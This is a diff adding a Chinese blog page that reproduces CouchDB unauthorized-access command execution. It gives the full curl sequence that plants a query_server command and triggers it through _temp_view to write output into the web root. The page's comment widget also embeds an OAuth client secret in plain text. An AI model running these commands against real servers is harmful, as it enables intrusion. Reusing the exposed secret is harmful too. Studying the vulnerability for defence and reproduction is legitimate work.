@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+    <meta name="description" content="内网渗透实战篇">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    CouchDB未授权访问导致的任意系统命令执行 |
+    
+    炎Φ帝</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/technology.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <section class="outer">
+  <article id="post-CouchDB未授权访问导致的任意系统命令执行" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      CouchDB未授权访问导致的任意系统命令执行
+    </h1>
+  
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2021/03/09/CouchDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="article-date">
+  <time datetime="2021-03-09T14:07:03.000Z" itemprop="datePublished">2021-03-09</time>
+</a>
+        
+      </div>
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+      
+
+      
+        <p>1、漏洞分析</p>
+<pre><code>  CouchDB 是一个开源的面向文档的数据库管理系统，可以通过 RESTful JavaScript Object Notation (JSON) API 访问，默认会在5984端口开放Restful的API接口，如果使用SSL的话就会监听在6984端口，用于数据库的管理功能。其HTTP Server默认开启时没有进行验证，而且绑定在0.0.0.0，所有用户均可通过API访问导致未授权访问。
+
+   漏洞原因
+  query_server，可以使用二进制文件或脚本和db进行数据交互
+  couchdb提供了一个api接口用来更改自身的配置，并把修改后的结果保存到配置文件中：</code></pre>
+<p>这就导致了，我们可以去执行系统命令<br>       默认5984端口</p>
+<p><img src="/images/pasted-160.png" alt="upload successful"></p>
+<pre><code>   访问脆弱的服务
+   http://x.x.x.x:5984/_config
+   http://x.x.x.x:5984/_utils/</code></pre>
+<p><img src="/images/pasted-161.png" alt="upload successful"></p>
+<p>2、漏洞利用</p>
+<pre><code>   新增query_server配置，写入要执行的命令；
+   curl -X PUT &#39;http://username:password@your-ip:5984/_config/query_servers/cmd&#39; -d &#39;&quot;id &gt;/tmp/success&quot;&#39;
+   未授权访问则不需要写账户密码</code></pre>
+<p>  2.1 新增query_server配置，这里执行请求我们攻击机脚本的命令</p>
+<pre><code>   curl -X PUT &#39;http://X.X.X.X:5984/_config/query_servers/cmd&#39; -d &#39;&quot;/sbin/ifconfig &gt;/var/www/html/a.txt&quot;&#39;</code></pre>
+<p> 2.2 新建临时表</p>
+<pre><code>   curl -X PUT &#39;http://X.X.X.X:5984/vultest&#39;</code></pre>
+<p>   插入数据</p>
+<pre><code>   curl -X PUT &#39;http://X.X.X.X:5984/vultest/vul&#39; -d &#39;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&#39;</code></pre>
+<p>2.3 调用query_server 处理数据</p>
+<pre><code>   curl -X POST &#39;http://X.X.X.X:5984/vultest1/_temp_view?limit=11&#39; -d &#39;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&#39; -H &#39;Content-Type: application/json&#39;</code></pre>
+<p><img src="/images/pasted-162.png" alt="upload successful"></p>
+<pre><code>虽然显示报错，但是在网站根目录已经生成了a.txt文件</code></pre>
+<p><img src="/images/pasted-163.png" alt="upload successful"></p>
+<div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script src="https://priesttomb.github.io/js/md5.min.js"></script>
+<script >
+var gitalk = new Gitalk({
+  clientID: '89b3b32fddb4b2644811',
+  clientSecret: 'b6c19077bfed9b255a3a17f4d628854f21098b94',
+  repo: 'shenligang123.github.io',
+  owner: 'shenligang123',
+  admin: 'shenligang123',
+  id: md5(location.pathname),      // Ensure uniqueness and length less than 50
+  distractionFreeMode: false  // Facebook-like distraction free mode
+})
+gitalk.render('gitalk-container')
+</script>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/03/09/CouchDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" data-id="ckm94vxp20002fcut92dq4ys4"
+         class="article-share-link">分享</a>
+      
+    </footer>
+
+  </div>
+
+  
+    
+  <nav class="article-nav">
+    
+      <a href="/2021/03/14/Webmin%E6%9C%AA%E7%BB%8F%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%9A%84%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            Webmin未经身份验证的远程代码执行
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2021/03/09/uWSGI-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2018-7490%EF%BC%89/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">uWSGI 漏洞复现（CVE-2018-7490）</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+    
+  <div class="gitalk" id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: '89b3b32fddb4b2644811',
+      clientSecret: 'b6c19077bfed9b255a3a17f4d628854f21098b94',
+      repo: 'shenligang123.github.io',
+      owner: 'shenligang123',
+      admin: ['shenligang123'],
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: md5(location.pathname),
+      distractionFreeMode: false,  // Facebook-like distraction free mode
+      pagerDirection: 'last'
+    })
+
+  gitalk.render('gitalk-container')
+  </script>
+
+  
+
+</article>
+
+
+
+</section>
+    </div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+<script src="/js/technology.js"></script>
+
+
+  </div>
+</body>
+</html>
